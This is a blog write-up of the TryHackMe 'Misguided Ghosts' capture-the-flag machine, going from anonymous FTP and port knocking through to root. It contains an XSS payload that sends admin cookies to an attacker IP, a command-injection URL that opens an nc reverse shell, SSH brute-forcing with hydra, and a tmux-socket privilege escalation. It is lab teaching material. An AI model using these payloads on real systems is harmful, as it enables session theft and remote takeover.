---
layout: default
title : m3dsec - Misguided Ghosts Writeup
---

_**Nov 09, 2020**_


<div style="text-align:center"><img src="../../assets/images/thm_misguided_Ghosts/misguidedghosts.png" /></div>

<h2 id="Overview">Overview</h2>

How i got root in [Misguided Ghosts](https://tryhackme.com/room/misguidedghosts) Machine from [TryHackMe](https://tryhackme.com/).


<h2 id="Target-Informations">Target Informations</h2>

```sh
Machine Name : Anonymous Playground
IP Adress    : 10.10.29.172
Decription   : Explore your inner daemons with this hard box!
Difficulty   : Rated Hard
```

<h2 id="Discovery-reconnaissance">Discovery & reconnaissance</h2>

We Start by scaning our target Host :
```sh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.123.226
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)
|   256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)
|_  256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We got 2 open ports, ftp and ssh, Anonymous FTP login is allowed, means we dont need a password to access ftp.

<br>
<h4 id="">Enumerating FTP</h4>

I used ncftp client to login into ftp, a cool client by the way.
```SH
m3dsec@local:~/misguidedghosts.thm$ ncftp 10.10.29.172
NcFTP 3.2.5 (Feb 02, 2011) by Mike Gleason (http://www.NcFTP.com/contact/).
Connecting to 10.10.29.172..                                      
(vsFTPd 3.0.3)
Logging in..                                                          
Login successful.
Logged in to 10.10.29.172.                                                                                                                                           
ncftp / > ls -lat
drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 pub
drwxr-xr-x    3 ftp      ftp          4096 Aug 18 18:32 ..
drwxr-xr-x    3 ftp      ftp          4096 Aug 18 18:32 .
ncftp / > cd pub
Directory successfully changed.
ncftp /pub > ls -lat
drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 .
-rw-r--r--    1 ftp      ftp           103 Aug 28 18:11 info.txt
-rw-r--r--    1 ftp      ftp           248 Aug 26 18:51 jokes.txt
drwxr-xr-x    3 ftp      ftp          4096 Aug 18 18:32 ..
-rw-r--r--    1 ftp      ftp        737512 Aug 18 18:12 trace.pcapng
```

Withing FTP we can see several files, one of them is a pcapng captured data, sounds interesting, but 1st lets read what inside the other files:

```sh
m3dsec@local:~/misguidedghosts.thm/files/ftp$ cat info.txt 
I have included all the network info you requested, 
along with some of my favourite jokes.

- Paramore
```

```sh
m3dsec@local:~/misguidedghosts.thm/files/ftp$ cat jokes.txt 
Taylor: Knock, knock.
Josh:   Who's there?
Taylor: The interrupting cow.
Josh:   The interrupting cow--
Taylor: Moo

Josh:   Knock, knock.
Taylor: Who's there?
Josh:   Adore.
Taylor: Adore who?
Josh:   Adore is between you and I so please open up!
```
Alright, only from those 2 files, we can grab several usernames (Paramore,Josh,Taylor)
and the fact that "Knock, knock" could means the well known [Port Knocking](https://en.wikipedia.org/wiki/Port_knocking) Technique


<h4 id="Port-Knocking">Port Knocking And Rescaning The network</h4>

Looking at the pcap file revealed the Host was likely using port knocking, 

<div style="text-align:center"> <img src="../../assets/images/thm_misguided_Ghosts/conversations.png"/></div>
<br>
<div style="text-align:center"> <img src="../../assets/images/thm_misguided_Ghosts/conversations2.png"/></div>


For This i used knockd after it i sleep so the knock take its place then i rescan the host:

```SH
m3dsec@local:~$ knock 10.10.29.172 7864 8273 9241 12007 60753 && sleep 1 && rustscan -a 10.10.29.172 -b 65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/m3dsec/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.29.172:21
Open 10.10.29.172:22
Open 10.10.29.172:8080
...
PORT     STATE SERVICE  REASON  VERSION
21/tcp   open  ftp      syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.123.226
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9IDvQd1gdoX05XWxhJT/V9SmKjyuZF45PHMiFEBOB3tDCcnBjFU7MeB+hRxYIVQ/gDupx4T9eBmh3f/v6N/cP2saOkCP1CsmaBANAwFe2t6jdKBnzzxb95J2xAAQgXlthLcMRzq07jqOu0eNT+m/Cq6mRo/bWCgx33OpUhILmAqXXgACw6eslNS8qxCh2/zCQVV2bfTydc3XMTATbWBoPq/mImFfnm0UumErn2uGQYiKFgKFJwV3hpG5fsqrYeWWFZmukljyn8sbjEctH7U19Bbb/9V1G9HjRZYBOTApm+7Ds3axxbrrqF/f9QDdCbu91yAi4mVeqOhjOIF/GCN/T
|   256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDsj0erpJ38s3yq182eEiOigD4wlNXRcY7nkWD7hHi89SNGO3WjPLqZxtWDMMn8CD8Bzf8zZBFFsZteCGimotw=
|   256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMFWXM1xds09Lx7X42b+YR+kfDp1G1IxAU+bS7hXEKjO
8080/tcp open  ssl/http syn-ack Werkzeug httpd 1.0.1 (Python 2.7.18)
| http-methods: 
|_  Supported Methods: GET
| ssl-cert: Subject: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN/localityName=Franklin/emailAddress=zac@misguided_ghosts.thm
| Issuer: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN/localityName=Franklin/emailAddress=zac@misguided_ghosts.thm
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T16:52:11
| Not valid after:  2021-08-11T16:52:11
| MD5:   81a2 a5d0 19ea 9ef4 37e9 ebfd b6cc 6d9f
| SHA-1: 0ea3 45de 594b 091c 1972 8e43 a7da d929 78c5 0a02
| -----BEGIN CERTIFICATE-----
| MIIGIzCCBAugAwIBAgIUe1l5EK+Cz0bL9EgjYIbyYgsm/HMwDQYJKoZIhvcNAQEL
| BQAwgaAxCzAJBgNVBAYTAlROMRswGQYDVQQIDBJXaWxsaWFtc29uIENvdW50cnkx
...
| zQrf2PYctdAzxHq25O/ZIfYZYjIwVGaiIZiMxj/p2FQcVjdgId9aPWdvfeXfVnnk
| mvRdTCtOJzU4PZeuUUMp/PlUzxrMcq7Y5wSSEPLxXFJ7Gg5jjc2uiqIDXv22qSfY
| +aNVowOwh9V0MHKtutzcIKAvbwN9S9AmWOvNmAGu6N+yTj2r0uTE
|_-----END CERTIFICATE-----
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

As we can see Port Knocking disclosed another Port 8080, a Werkzeug daemon, with a Self-signed certificate.


<h4 id="">Bruteforcing Directories & Login Bypass</h4>

```SH
m3dsec@local:~/misguidedghosts.thm$ ffuf -c -u https://10.10.29.172:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt 
https://10.10.29.172:8080/login                   [Status: 200, Size: 761, Words: 107, Lines: 29]
https://10.10.29.172:8080/dashboard               [Status: 302, Size: 219, Words: 22, Lines: 4]
https://10.10.29.172:8080/console                 [Status: 200, Size: 1985, Words: 411, Lines: 53]
```
<br>
Disclosed an intersting login page :eyes:
<div style="text-align:center"> <img src="../../assets/images/thm_misguided_Ghosts/login_page.png"/></div>

<br>
Tried Diffrent Bypassing techniques, nothing came out, checking the ssl certificat gave us a username
<div style="text-align:center"> <img src="../../assets/images/thm_misguided_Ghosts/certificat.png"/></div>

<br>
I Kinda Throw it directly as zac:zac, and it worked, The user was the same as the password
<div style="text-align:center"> <img src="../../assets/images/thm_misguided_Ghosts/welcom_zac.png"/></div>

<br>

Obviously <u>"Create a post below; admins will check every two minutes so don't be rude."</u> Give us a big hint that this is a Client-Side attack, So i assumed its an XSS attack and this is the payload i used to grab the admin cookies:

```SH
&lt;sscriptcript&gt;var i = new Image();i.src="http://10.9.123.226/"+document.cookie;&lt;/sscriptcript&gt;
```

<div style="text-align:center"> <img src="../../assets/images/thm_misguided_Ghosts/xss.png"/></div>


<br>

After 2 minutes, i got the admin cookies back

<div style="text-align:center"> <img src="../../assets/images/thm_misguided_Ghosts/cookies.png"/></div>


<br>

But tho the admin Dashboard was useless, so i brute forced again with the admin cookies :
```SH
m3dsec@local:~/misguidedghosts.thm$ fuf -c -u https://10.10.29.172:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -b 'login=hayley_is_admin'
https://10.10.29.172:8080/login                   [Status: 200, Size: 761, Words: 107, Lines: 29]
https://10.10.29.172:8080/dashboard               [Status: 302, Size: 219, Words: 22, Lines: 4]
https://10.10.29.172:8080/photos                  [Status: 200, Size: 761, Words: 107, Lines: 29]
https://10.10.29.172:8080/console                 [Status: 200, Size: 1985, Words: 411, Lines: 53]
```

<br>

Once Again We tripped Against an upload Form, i tested file upload vulnerability on it, but it always gave the same output everytime, so i start fuzzing, i tripped against the -1 as an input, and the application listed back all the files.
```SHS
m3dsec@local:~$ curl -s -k -b 'login=hayley_is_admin' 'https://10.10.29.172:8080/photos?image=-1' |grep -i '<pre>' -A4000
		  <pre>Dockerfile
app.py
cert.pem
key.pem
requirements.txt
start.sh
static
stop.sh
templates
...
```

And injectign id command throw back the user and group information :
```SH
m3dsec@local:~$ curl -s -k -b 'login=hayley_is_admin' 'https://10.10.29.172:8080/photos?image=;id' |grep -i '<pre>' -A4000
		  <pre>Dockerfile
app.py
cert.pem
key.pem
requirements.txt
start.sh
static
stop.sh
templates
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
...
```


<br>

We then tried to reverse a Shell :
```SH
m3dsec@local:~$ curl -s -k -b 'login=hayley_is_admin' 'https://10.10.29.172:8080/photos?image=rm${IFS}/tmp/f;mkfifo${IFS}/tmp/f;cat${IFS}/tmp/f|/bin/sh${IFS}-i|nc${IFS}10.9.123.226${IFS}9991>/tmp/f'
```

Back To our listener, we can see our Reverse Shell popup. and voila we got root.
<div style="text-align:center"> <img src="../../assets/images/thm_misguided_Ghosts/docker.png"/></div>

:joy: naah im just kidding, we where actually inside a docker container wich is fun actually.


<h2 id="Local-System-Enumeration">Local System Enumeration</h2>

Once inside the target host, we start enumerating Internally, we got 2 interesting files from the user zac home directory
```SH
/home/zac/notes # ls -lat
total 16
drwxr-xr-x    3 root     root          4096 Nov 10 14:39 ..
drwxrwxr-x    2 1001     1001          4096 Aug 26 02:11 .
-rw-r--r--    1 1001     1002           270 Aug 25 00:34 .secret
-rw-r--r--    1 1001     1002          1675 Aug 25 00:14 .id_rsa
/home/zac/notes # cat .secret
Zac,

I know you can never remember your password, so I left your private key here so you don't have to use a password. I ciphered it in case we suffer another hack, but I know you remember how to get the key to the cipher if you can't remember that either.
- Paramore

/home/zac/notes # cat .id_rsa
-----BEGIN RSA PRIVATE KEY-----
NCBXsnNMYBEVTUVFawb9f8f0vbwLpvf0hfa1PYy0C91sYIG/U5Ss15fDbm2HmHdS
CgGHOkqGhIucEqe4mrcwZRY3ooKX2uB8IxJ6Ke9wM6g8jOayHFw2/UPWnveLxUQq
0Z/g9X5zJjaHfPI62OKyOFPEx7Mm0mfB5yRIzdi0NEaMmxR6cFGZuBaTOgMWRIk6
aJSO7oocDBsVbpuDED7SzviXvqTHYk/ToE9Rg/kV2sIpt7Q0D0lZNhz7zTo79IP0
TwAa61/L7ctOVRwU8nmYFoc45M0kgs5az0liJloOopJ5N3iFPHScyG0lgJYOmeiW
QQ8XJJqqB6LwRVE7hgGW7hvNM5TJh4Ee6M3wKRCWTURGLmJVTXu1vmLXz1gOrxKG
a60TrsfLpVu6zfWEtNGEwC4Q4rov7IZjeUCQK9p+4Gaegchy1m5RIuS3na45BkZL
4kv5qHsUU17xfAbpec90T66Iq8sSM0Je8SiivQFyltwc07t99BrVLe9xLjaETX/o
DIk3GCMBNDui5YhP0E66zyovPfeWLweUWZTYJpRsyPoavtSXMqKJ3M4uK00omAEY
cXcpQ+UtMusDiU6CvBfNFdlgq8Rmu0IU9Uvu+jBBEgxHovMr+0MNMcrnYmGtTVHe
gYUVd7lraZupxArh1WHS8llbj9jgQ5LhyAiGrx6vUukyFZ8IDTjA5BmmoBHPvmbj
mwRx+RJNeZYT3Pl/1Qe8Uc4IAim3Y7yzMMfoZodw/g2G2qx4sNjYLJ8Mry6RJ8Fq
wf2ES1WOyNOHjQ2iZ1JrXfJnEc/hU1J3ZLhY7p6oO+DAd7m5HomDik/vUTXlS3u1
A1Pr4XRZW0RYggysRmUTqVEiuTIMY4Y0LhIbY/Vo8pg6OTyKL0+ktaCDaRXEnZBp
VU1ABBWoGPfXgUpEOsvgafreUVHnyeYru8n4L8WB/V7xUk56mcU6pobmD3g19T6n
ddocO8sVX6W8mhPVllsc6l+Xl4enJUmReXmXaiPiHoch1oaCgrYYmsONThM7QUut
oOIGdb6O/3qfZA+V+EIm3tP+3U/+RsurKmrpVIFWzRIRuj90aBhOzNBsAHloOlOB
LCuVjI5M6VuXJ+YY9M9biS2qafFUgIUaKYMVdzDtJFkMhACpJqpy+w6owW0hn3vA
H6gpsbnl3zm3ey0JMqnDbwWqKFWTU6DK8V5o6whXZJRXJb1Lxs38PiAry9TPRGVA
M5EY0XxjniOoesweDGHryeJNeZV9iRP/CAV0LGDx7FAtl3a7p3DGb2qz0FL6Dyys
vgh73EndW0xa6N8clLyA1/GR5x54h+ayGzMQa8d4ZdAhWl+CZMpTjqEEYKRL9/Xc
eXU3MNVuPeDrqdjYGg+4xXtSaLwSbOmGwH/aED2j4xxgraMo3Bp+raHGmOEex/RL
1nCbZKDUkUP3Cv8mc9AAVs8UN6O6/nZo1pISgJyPjuUyz7S/paSz04x7DjY80Ema
r8WpMKfgl3+jWta+es1oL6DtD9y7RD5u9RPSXGNt/3QwNu+xNlle39laa8UZayPI
VhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj
-----END RSA PRIVATE KEY-----
```

The RSA key seems odd, We know that every PEM body starts with the characters MII, but here we have NCB instead, the key must be rotated somehow.

Vigenere Cipher Sounds like a good condidate, knowing A Plain Text Word from the decrypted cipher we can decipher our private key, for this i used **[vigenereBruteForce](https://github.com/bobloblaw321/vigenereBruteForce)** a pretty nice implementation to bruteforce Vigenere Cipher.

<div style="text-align:center"> <img src="../../assets/images/thm_misguided_Ghosts/vigenere_brute_force.png"/></div>

<br>
Within CyberChef We decipher our private key :
<div style="text-align:center"> <img src="../../assets/images/thm_misguided_Ghosts/cyberchef.png"/></div>

<br>
Fix the tail and header, and login as zac user with the final deciphered private key

<div style="text-align:center"> <img src="../../assets/images/thm_misguided_Ghosts/zac_user.png"/></div>


<br>
Inspecting Open Ports inside the target host, We can see an open SMB port.

```SH
zac@misguided_ghosts:~$ ss -tunlp
Netid            State              Recv-Q             Send-Q                              Local Address:Port                           Peer Address:Port             
udp              UNCONN             0                  0                                         0.0.0.0:37772                               0.0.0.0:*                
udp              UNCONN             0                  0                                   127.0.0.53%lo:53                                  0.0.0.0:*                
udp              UNCONN             0                  0                               10.10.29.172%eth0:68                                  0.0.0.0:*                
tcp              LISTEN             0                  128                                 127.0.0.53%lo:53                                  0.0.0.0:*                
tcp              LISTEN             0                  128                                       0.0.0.0:22                                  0.0.0.0:*                
tcp              LISTEN             0                  50                                      127.0.0.1:445                                 0.0.0.0:*                
tcp              LISTEN             0                  50                                      127.0.0.1:139                                 0.0.0.0:*                
tcp              LISTEN             0                  128                                     127.0.0.1:46315                               0.0.0.0:*                
tcp              LISTEN             0                  32                                              *:21                                        *:*                
tcp              LISTEN             0                  128                                          [::]:22                                     [::]:*                
tcp              LISTEN             0                  50                                          [::1]:445                                    [::]:*                
tcp              LISTEN             0                  50                                          [::1]:139                                    [::]:*                
zac@misguided_ghosts:~$ 
```



<br>

As the target host doesn't include SMB system related tools, like smbmap or smbclient, i'll be reverse port forwarding port 445 to my local machine for furthur investigation: 

```SH
zac@misguided_ghosts:~$ ssh -R 4455:127.0.0.1:445 m3dsec@10.9.123.226 -N -f
The authenticity of host '10.9.123.226 (10.9.123.226)' can't be established.
ECDSA key fingerprint is SHA256:jtZPaZGzdQgns9gmC6kIZWaQhNeG2vYZflH/wGMqnq0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.9.123.226' (ECDSA) to the list of known hosts.
m3dsec@10.9.123.226's password: 
zac@misguided_ghosts:~$ 
```

<br>
Back To my host we see the new open smb port, lets explore it :

```SH
m3dsec@local:~/misguidedghosts.thm$ ss -tunlp|grep 445
tcp   LISTEN 0      128                            127.0.0.1:4455       0.0.0.0:*                                        
tcp   LISTEN 0      128                                [::1]:4455          [::]:* 
m3dsec@local:~/misguidedghosts.thm$ smbclient -L \\\\127.0.0.1 -p 4455
Enter WORKGROUP\m3dsec's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	local           Disk      Local list of passwords for our services
	IPC$            IPC       IPC Service (misguided_ghosts server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

The Folder `local` Sounds interesting:
```SH
m3dsec@local:~/misguidedghosts.thm$ smbclient \\\\127.0.0.1\\local -p 4455
Enter WORKGROUP\m3dsec's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug 26 15:31:28 2020
  ..                                  D        0  Tue Aug 25 01:00:53 2020
  passwords.bak                       N      160  Wed Aug 26 15:31:28 2020
mg
		19475088 blocks of size 1024. 8564688 blocks available
smb: \> mget passwords.bak
Get file passwords.bak? yes
getting file \passwords.bak of size 160 as passwords.bak (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
```

The `passwords.bak` file contain some passwords, 
```SH
m3dsec@local:~/misguidedghosts.thm$ cat passwords.bak 
pft7vPl
HQ@5Y64
Ls7kZxv
...
```

<br>

BruteForcing `hayley` SSH account against that passwords list, We successfully BruteForced that hayley ssh account:

```SH
m3dsec@local:~/misguidedghosts.thm$ hydra -l hayley -P passwords.bak ssh://10.10.29.172
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-10 12:14:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task
[DATA] attacking ssh://10.10.29.172:22/
[22][ssh] host: 10.10.29.172   login: hayley   password: *******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-10 12:14:40
```

Then We ssh as user hayley with the password we retrived.


<br>
<h2 id="Local-Privilege-Escalation">Local Privilege Escalation</h2>

Furthur Enumeration was done, untill we got an interesting Processes

```SH
hayley@misguided_ghosts:~$ id
uid=1000(hayley) gid=1000(hayley) groups=1000(hayley),1002(paramore)
hayley@misguided_ghosts:~$ ps aux|grep root
...
root      1028  0.0  0.1  28540  2416 ?        Ss   17:22   0:00 /usr/bin/tmux -S /opt/.details new -s vpn -d
...
```

The Flag **-S** point to **/opt/.details** is used to specify the server socket path for [Tmux](https://wiki.archlinux.org/index.php/tmux),

```SH
hayley@misguided_ghosts:~$ ls -lat /opt/.details
srw-rw---- 1 root paramore 0 Nov 10 17:22 /opt/.details
```

On this situation our groupe (paramore) have the read-write permission over Tmux socket file, means that Tmux is prone to a local privilege-escalation vulnerability, We can easly Exploit this by Running Tmux withing the context of the same Path:

```SH
hayley@misguided_ghosts:/var/tmp$ tmux -S /opt/.details
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
{p1v**********un}
```

<br>

<h2 id="Conclution">Conclution </h2>

[Tryhackme](https://tryhackme.com/) is getting better and way better everyday, also Thanks to [Jake Ruston](https://tryhackme.com/p/JakeDoesSec) and [Bob Loblaw](https://tryhackme.com/p/bobloblaw) for such an amazing experiance.

<br>
<br>
Best Regards

[m3dsec](https://github.com/m3dsec).

<br>
<br>

[back to main()](../../index.md)

<br>